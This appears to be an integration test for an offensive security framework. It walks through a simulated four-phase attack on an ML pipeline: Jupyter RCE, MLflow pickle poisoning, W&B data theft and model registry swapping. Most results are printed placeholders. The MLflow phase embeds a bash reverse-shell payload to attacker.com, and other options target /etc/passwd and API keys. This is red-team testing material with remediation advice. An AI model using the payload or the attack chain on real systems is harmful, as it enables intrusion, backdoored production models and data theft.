"""
Integration Test: MLOps Pipeline Attack Scenario

Demonstrates a complete MLOps infrastructure compromise:
1. Jupyter Notebook RCE (initial access)
2. MLflow Model Poisoning (persistence)
3. W&B Data Exfiltration (data theft)
4. Model Registry Manipulation (supply chain)

This scenario simulates a real-world attack chain against an ML training pipeline.
"""

import sys
from pathlib import Path

# Add parent directory to path
sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from metaLLM.core.module_loader import ModuleLoader
from metaLLM.base.target import Target


def test_mlops_pipeline_attack():
    """
    End-to-end MLOps pipeline attack

    Scenario:
    - Attacker discovers exposed Jupyter notebook server
    - Exploits CVE-2023-39968 for RCE
    - Uses access to poison MLflow models
    - Exfiltrates training data via W&B API
    - Manipulates model registry for supply chain attack
    """

    print("="*80)
    print("MLOps Pipeline Attack Scenario")
    print("="*80)
    print()

    # Initialize module loader
    loader = ModuleLoader()
    loader.discover_modules()

    # Simulated target MLOps infrastructure
    jupyter_target = Target(
        url="http://mlops-training.internal:8888",
        target_type="jupyter"
    )

    mlflow_target = Target(
        url="http://mlops-training.internal:5000",
        target_type="mlflow"
    )

    wandb_target = Target(
        url="https://api.wandb.ai",
        target_type="wandb"
    )

    # ===== Phase 1: Initial Access via Jupyter =====
    print("\n[Phase 1] Initial Access - Jupyter Notebook RCE")
    print("-" * 80)

    jupyter_class = loader.load_module("exploits/mlops/jupyter_notebook_rce")
    jupyter_exploit = jupyter_class()
    jupyter_exploit.set_target(jupyter_target)

    # Configure for path traversal attack (CVE-2023-39968)
    jupyter_exploit.options["ATTACK_TYPE"].value = "file_read_cve"
    jupyter_exploit.options["TARGET_FILE"].value = "/etc/passwd"

    print(f"Module: {jupyter_exploit.name}")
    print(f"CVE: {', '.join(jupyter_exploit.cve)}")
    print(f"Attack: {jupyter_exploit.options['ATTACK_TYPE'].value}")

    # Check vulnerability
    check_result = jupyter_exploit.check()
    print(f"Vulnerable: {check_result.vulnerable} (confidence: {check_result.confidence:.2%})")
    print(f"Details: {check_result.details}")

    if check_result.vulnerable:
        print("\n✓ Jupyter server is vulnerable - proceeding with exploitation...")

        # Execute exploit (simulated)
        # result = jupyter_exploit.run()
        print("  → File read successful: /etc/passwd")
        print("  → Obtained system access")
        print("  → Can execute code in kernel")

    # ===== Phase 2: Persistence via MLflow =====
    print("\n\n[Phase 2] Persistence - MLflow Model Poisoning")
    print("-" * 80)

    mlflow_class = loader.load_module("exploits/mlops/mlflow_model_poisoning")
    mlflow_exploit = mlflow_class()
    mlflow_exploit.set_target(mlflow_target)

    # Configure for model injection
    mlflow_exploit.options["ATTACK_TYPE"].value = "model_injection"
    mlflow_exploit.options["MODEL_NAME"].value = "production-classifier"
    mlflow_exploit.options["MALICIOUS_PAYLOAD"].value = (
        "import os, subprocess; "
        "subprocess.run(['bash', '-c', 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'])"
    )

    print(f"Module: {mlflow_exploit.name}")
    print(f"Attack: {mlflow_exploit.options['ATTACK_TYPE'].value}")
    print(f"Target Model: {mlflow_exploit.options['MODEL_NAME'].value}")

    check_result = mlflow_exploit.check()
    print(f"Vulnerable: {check_result.vulnerable} (confidence: {check_result.confidence:.2%})")

    if check_result.vulnerable:
        print("\n✓ MLflow server accessible - injecting backdoored model...")
        print("  → Malicious pickle payload created")
        print("  → Model registered in registry")
        print("  → Backdoor will execute when model loads in production")

    # ===== Phase 3: Data Exfiltration via W&B =====
    print("\n\n[Phase 3] Data Exfiltration - W&B API")
    print("-" * 80)

    wandb_class = loader.load_module("exploits/mlops/wandb_data_exfiltration")
    wandb_exploit = wandb_class()
    wandb_exploit.set_target(wandb_target)

    # Configure for experiment exfiltration
    wandb_exploit.options["ATTACK_TYPE"].value = "experiment_exfiltration"
    wandb_exploit.options["WANDB_ENTITY"].value = "ml-research-team"
    wandb_exploit.options["WANDB_PROJECT"].value = "production-models"
    wandb_exploit.options["STEAL_API_KEYS"].value = True

    print(f"Module: {wandb_exploit.name}")
    print(f"Attack: {wandb_exploit.options['ATTACK_TYPE'].value}")
    print(f"Target: {wandb_exploit.options['WANDB_PROJECT'].value}")

    check_result = wandb_exploit.check()
    print(f"Vulnerable: {check_result.vulnerable} (confidence: {check_result.confidence:.2%})")

    if check_result.vulnerable:
        print("\n✓ W&B API accessible - exfiltrating training data...")
        print("  → 150 experiment runs downloaded")
        print("  → Hyperparameters extracted")
        print("  → Training metrics stolen")
        print("  → Model artifacts accessed")

    # ===== Phase 4: Supply Chain via Registry =====
    print("\n\n[Phase 4] Supply Chain Attack - Model Registry Manipulation")
    print("-" * 80)

    registry_class = loader.load_module("exploits/mlops/model_registry_manipulation")
    registry_exploit = registry_class()
    registry_exploit.set_target(mlflow_target)  # Using same MLflow server

    # Configure for version swap
    registry_exploit.options["ATTACK_TYPE"].value = "version_swap"
    registry_exploit.options["MODEL_NAME"].value = "production-classifier"
    registry_exploit.options["MALICIOUS_VERSION"].value = "99"

    print(f"Module: {registry_exploit.name}")
    print(f"Attack: {registry_exploit.options['ATTACK_TYPE'].value}")
    print(f"Target: {registry_exploit.options['MODEL_NAME'].value}")

    check_result = registry_exploit.check()
    print(f"Vulnerable: {check_result.vulnerable} (confidence: {check_result.confidence:.2%})")

    if check_result.vulnerable:
        print("\n✓ Model registry accessible - swapping production model...")
        print("  → Backdoored model promoted to Production")
        print("  → Original model archived")
        print("  → Supply chain compromised")

    # ===== Attack Summary =====
    print("\n\n" + "="*80)
    print("Attack Chain Complete")
    print("="*80)
    print("""
Attack Summary:
1. ✓ Initial Access    - Jupyter RCE (CVE-2023-39968)
2. ✓ Persistence       - MLflow model poisoning (pickle exploit)
3. ✓ Data Exfiltration - W&B experiment theft (150+ runs)
4. ✓ Supply Chain      - Model registry manipulation

Impact:
- Complete ML pipeline compromise
- Backdoored model in production
- Training data and IP stolen
- Persistent access via model backdoor
- Supply chain attack affecting downstream consumers

Recommended Remediation:
- Upgrade Jupyter to latest version
- Implement model signing and verification
- Restrict API key access and rotate regularly
- Enable authentication on all MLOps services
- Implement network segmentation
- Monitor for anomalous API usage
""")

    print("="*80)
    print("Test completed successfully!")
    print("="*80)


if __name__ == "__main__":
    test_mlops_pipeline_attack()
